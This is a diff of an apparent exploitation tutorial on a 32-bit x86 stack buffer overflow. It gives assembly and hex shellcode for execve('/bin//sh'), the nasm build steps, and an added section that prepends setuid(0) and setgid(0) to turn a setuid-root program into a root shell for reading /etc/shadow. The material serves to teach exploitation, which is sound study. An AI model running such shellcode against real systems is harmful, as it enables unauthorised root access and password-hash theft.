@@ -133,7 +133,7 @@ this overwrites the original return address.
 It should point somewhere inside the NOP sled, to ensure the CPU will eventually reach the shellcode.
 
 In our case, we have **512** bytes available to store the **shellcode** + the **nop sled** that for the following shellcode is plenty of space given that our shellcode is only 22 bytes long.\
-Now we have written a simple shellcode that is the equivalent of run `execve("/bin/bash",{NULL},{NULL})` in a machine with intel_x86 architecture.
+Using the [syscall table reference](https://x86.syscall.sh/), we have written a simple shellcode that is the equivalent of run `execve("/bin/bash",{NULL},{NULL})` in a machine with intel_x86 architecture.
 
 ```c
 xor eax,eax // generate a null value without using \x00 (bad character)
@@ -144,12 +144,12 @@ push 0x6e69622f // push "nib/"
 mov ebx,esp // $ebx contain the pointer to the first parameter of execve => $esp points to "/bin//sh"  
 mov ecx,eax // $ecx contain the pointer to the second parameter of execve => $eax is null
 sub eax,-0x0b // $eax contain the syscall number, use the subtraction to avoid \x0b (possible bad character)
-int 80h // trigger the syscall
+int 0x80 // trigger the syscall
 ```
 
 Let's proceed compiling the assembly file and extract the shellcode in hex format: 
 1. make the object file using: `nasm -f elf32 ./utils/shellcode1.asm -o ./obj/shellcode.o`
-2. using the tool `bin2shell` extract the shellcode: `./bin2shell.sh ./obj/shellcode.o`
+2. using the tool `bin2shell` extract the shellcode: `./utils/bin2shell.sh ./obj/shellcode.o`
 3. we finally get our shellcode: `\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x83\xe8\xf5\xcd\x80`
 
 Now that we have all we need, lets craft the payload:
@@ -177,8 +177,45 @@ Success — we’ve spawned a shell!
 
 ### (3) Adjusting the shellcode to gain more privileges
 
+Now we have access to a shell, however it have the privileges of the user "victim" who is the user that run the application.
+Unfortunately, victim have very few privileges, and for example we may want, gain the access to `/etc/shadow` to read all the users encrypted passwords.
+Analyzing the environment i have found that the owner of the application is **root**, and the `s` flag is set in the permissions of that folder.
 
+![codeexec 6](docs/images/codeexec%206.jpeg)
 
+The `s` flag in owner file permissions allows the program to be executed as the owner even if "victim" starts it.
+So let's modify the previous shellcode to exploit this system administrator mistake.
+
+```Assembly
+// run setuid(0)
+xor eax, eax // zeroing $eax
+mov ebx, eax // uid = 0 is the root uid 
+mov al, 0x17 // setting syscall number
+int 0x80 // trigger the syscall
+
+// run setgid(0)
+// id = 0 is the sudoers id (already in ebx)
+xor eax, eax // zeroing $eax
+mov al, 0x2e // setting syscall number
+int 0x80 // trigger the syscall
+
+// execve("/bin//sh", NULL, NULL)
+xor eax,eax
+cdq
+push eax
+push 0x68732f2f
+push 0x6e69622f
+mov ebx,esp
+mov ecx,eax
+sub eax,-0x0b
+int 0x80
+```
+
+Now, proceed like before generate the payload and provide it as input to the program.
+
+![codeexec 7](docs/images/codeexec%207.jpeg)
+
+Success — we’ve spawned a root shell!
 
 
 
